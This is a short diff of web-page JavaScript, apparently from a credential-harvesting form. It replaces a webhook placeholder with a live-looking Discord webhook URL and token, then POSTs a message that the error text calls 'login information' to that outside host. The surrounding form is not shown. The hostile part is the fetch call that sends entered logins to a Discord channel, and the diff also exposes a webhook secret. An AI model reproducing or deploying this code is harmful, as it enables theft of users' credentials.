@@ -53,13 +53,15 @@
     
             console.log("Sending the following data to Discord: ", message); // Debugging log
     
-            // Send the message to Discord using a webhook
-            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+            // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+            fetch('https://discord.com/api/webhooks/1239160408548446269/y091SCRKe03J6DgCrVNHZb4coTxF7sr5OlaV3oJm144d7tKALX-Pf9H8134UUPL8CVKw', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ content: message }),
+                body: JSON.stringify({
+                    content: message
+                }),
             })
             .then(response => {
                 if (!response.ok) {
@@ -71,7 +73,7 @@
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('Failed to submit login information.');
+                alert('Failed to submit login information. See console for more details.');
             });
         });
     
